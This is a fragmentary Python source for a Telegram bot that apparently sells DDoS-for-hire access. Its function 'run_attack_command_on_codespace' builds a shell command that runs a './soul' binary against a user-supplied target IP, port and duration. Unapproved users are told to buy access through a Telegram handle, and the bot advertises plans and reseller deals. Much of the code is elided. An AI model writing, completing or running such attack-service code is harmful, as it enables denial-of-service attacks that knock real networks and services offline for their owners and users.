...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 99"
    try:
...
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@Hack_chiye*", parse_mode='Markdown')
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@Hack_chiye*", parse_mode='Markdown')
...
if __name__ == "__main__":
    ...
    logging.info("swarg SERVER RUNNING.....")
    while True:
        try:
